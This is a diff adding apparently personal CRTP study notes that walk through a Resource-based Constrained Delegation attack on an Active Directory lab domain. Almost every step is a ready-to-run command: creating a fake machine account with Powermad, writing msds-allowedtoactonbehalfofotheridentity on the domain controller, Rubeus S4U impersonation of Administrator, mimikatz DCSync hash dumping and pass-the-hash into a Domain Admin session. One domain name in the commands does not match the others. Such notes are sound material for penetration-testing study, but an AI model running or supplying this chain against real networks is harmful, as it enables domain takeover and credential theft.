@@ -2204,3 +2204,84 @@ Enter-PSSession -ComputerName dcorp-mssql.dollarcorp.moneycorp.LOCAL
 ```
 SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
+
+# Resource-based Constrained Delegation (RBCD)
+in RBCD delegation authority moved from the domain admin to the resource/service
+
+we need to have two privileges
+
+1. Generic All, Generic Write, or Write Property permission over the target service or object
+2. control over an object which has SPN configured
+
+This technique will create a fake device, specify a specific password for it, and then add New Property to the target device, which is `"msds-allowedtoactonbehalfofotheridentity"` Contains the SID value of the fake device.
+
+After that, we will use the Rubeus tool, so that we request any service on the target device, such as http in order to set up PS Remoting, or cifs in order to browse the files of the target device or host in order to implement scheduling tasks, and we obtain a Reverse Shell or ldap if the target device is the DC, so that it withdraws the hash. Private in Domain Admins and implement the Pass the Hash technique, and all of these requests will be through the fake device.
+
+### Attack
+1. I'm using a HRmanager user
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2c0e0661-d231-456c-9068-08b8fa32c630)
+2. Load PowerView
+```
+Import-Module .\powerview.ps1
+```
+3. check if the HRmanager user has interesting ACLs
+```
+Find-InterestingDomainAcl -ResolveGUIDs
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/e3b4a62b-3134-4d0f-bccc-38aae3c23318)
+
+Now, if we notice that the HRmanager user in the IdentityReferenceName field contains the Write Property permission on the Domain Controller device in the ObjectDN field (OU)
+4. Now download [PowerMad](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1) to create a fake computer
+5. Load PowerMad
+```
+Import-Module .\powermad.ps1
+```
+6. create a fake pc which has a password `"123"`
+```
+New-MachineAccount -Domain cyber.local -MachineAccount dude -Password (ConvertTo-SecureString '123' -AsPlainText -Force) -Verbose
+```
+7. Now we need to extract the private SID on the fake device using this command
+```
+Get-NetComputer dude | select objectsid
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/c6e7d638-7824-4841-a3e0-6a149bf2dd40)
+8. Now that we have extracted the private SID on the fake device, we will execute these commands while replacing the private SID on the fake device.
+```
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4117163453-3728762355-2024759166-1601)"
+
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+
+$SD.GetBinaryForm($SDBytes, 0)
+```
+9. Now we will create a new property for the target device called msds-allowedtoactonbehalfofotheridentity and assign it the value of the private SID in the fake device
+```
+Get-netcomputer jehaddc.m3c.local | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+```
+10. Now I will load the Rubeus tool and we will execute this command so that it gives us an AES256 encrypted copy of the private password on the fake device.
+```
+.\Rubeus.exe hash /password:123 /user:dude$  /domain:cyber.local
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/a91bd270-d277-411d-b9b8-26364961813a)
+11. Now we will execute this command to obtain the TGS of the ldap service, since the target device is the Domain Controller (DC).
+```
+.\Rubeus.exe s4u /domain:cyber.local /dc:JehadDC.cyber.local /user:dude$ /ptt /aes256:5B9C740C2E833C237562871A4B3C3B7FF7839D48C3CBB3CBB152E2E82C981928  /impersonateuser:Administrator /msdsspn:ldap/jehaddc.cyber.local
+```
+12. Now, after executing the previous command, we will confirm whether the TGS was injected into the memory or not through this command.
+```
+klist
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/d18aba56-540b-42ba-b2c7-29eb8764682b)
+13. Now that we have the private TGS in the ldap service, we will run mimikatz and get the private hash in the Domain Admin via this command
+```
+lsadump::dcsync /user:cyber\Administrator
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/ee8ab9cd-2ad8-4bbd-8356-5fade3a5c5a2)
+14. Now we will set up the pass the hash technique using mimikatz so that we run a PowerShell session with Domain Admin privileges using this command.
+```
+sekurlsa::pth /user:Administrator /ntlm:311fb27b1e766dac7357f4270f4112df /domain:cyber.local /run:powershell.exe
+```
+15. After executing the command, a powershell session will be opened for us with Domain Admin privileges. All we have to do is execute this command in order to access the target device.
+```
+Enter-PSSession jehaddc.cyber.local
+```
+![image](https://github.com/AbdullahZuhair21/CRTP/assets/154827329/2e859f3e-1943-4296-862e-846e1033966d)
